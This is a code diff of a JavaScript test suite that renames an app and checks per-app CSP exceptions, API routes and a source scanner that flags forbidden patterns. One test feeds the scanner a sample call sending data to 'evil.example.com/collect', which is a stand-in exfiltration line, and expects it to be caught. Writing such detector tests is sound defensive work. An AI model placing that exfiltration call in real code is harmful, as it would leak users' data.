@@ -5,10 +5,10 @@ import { CSP, toSwaConfig } from './manifests.mjs';
 
 const manifest = { name: 'x', description: 'x', category: 'サポート', owner: 'x', status: 'available', access: ['authenticated'] };
 const apps = [
-  { dept: 'ai', app: 'taskuri', manifest },
+  { dept: 'cp', app: 'tasukuri', manifest },
   { dept: 'bm', app: 'equipment', manifest },
 ];
-const caps = { 'ai-taskuri': ['microsoft-graph-mail', 'platform-api'] };
+const caps = { 'cp-tasukuri': ['microsoft-graph-mail', 'platform-api'] };
 
 describe('アプリごとの例外（ケイパビリティ）', () => {
   it('登録ファイルの名前はすべて定義済み', () => {
@@ -18,11 +18,11 @@ describe('アプリごとの例外（ケイパビリティ）', () => {
 
   it('許可されたアプリだけ、CSP に Microsoft の通信先が追加され、API のルートができる', () => {
     const { routes } = toSwaConfig(apps, caps);
-    const taskuri = routes.find((r) => r.route === '/ai/taskuri/*');
+    const taskuri = routes.find((r) => r.route === '/cp/tasukuri/*');
     expect(taskuri.headers['Content-Security-Policy']).toContain('connect-src \'self\' https://graph.microsoft.com https://login.microsoftonline.com');
     expect(routes.find((r) => r.route === '/bm/equipment/*').headers).toBeUndefined();
-    expect(routes.find((r) => r.route === '/api/ai-taskuri/*').allowedRoles).toEqual(['authenticated']);
-    expect(routes.findIndex((r) => r.route === '/api/ai-taskuri/*')).toBeLessThan(routes.findIndex((r) => r.route === '/*'));
+    expect(routes.find((r) => r.route === '/api/cp-tasukuri/*').allowedRoles).toEqual(['authenticated']);
+    expect(routes.findIndex((r) => r.route === '/api/cp-tasukuri/*')).toBeLessThan(routes.findIndex((r) => r.route === '/*'));
   });
 
   it('標準の CSP は変わらない（外部への送信は禁止のまま）', () => {
@@ -31,7 +31,7 @@ describe('アプリごとの例外（ケイパビリティ）', () => {
   });
 
   it('禁止パターン：許可されたホストへの通信だけを見逃し、それ以外の外部URLは検出する', () => {
-    const allow = capabilitiesFor('ai-taskuri', caps);
+    const allow = capabilitiesFor('cp-tasukuri', caps);
     expect(scanSource("await fetch('https://graph.microsoft.com/v1.0/me')", allow)).toEqual([]);
     expect(scanSource("await fetch('https://evil.example.com/collect')", allow).map((f) => f.rule)).toEqual(['external-url']);
     expect(scanSource('eval(x)', allow).map((f) => f.rule)).toEqual(['eval']);
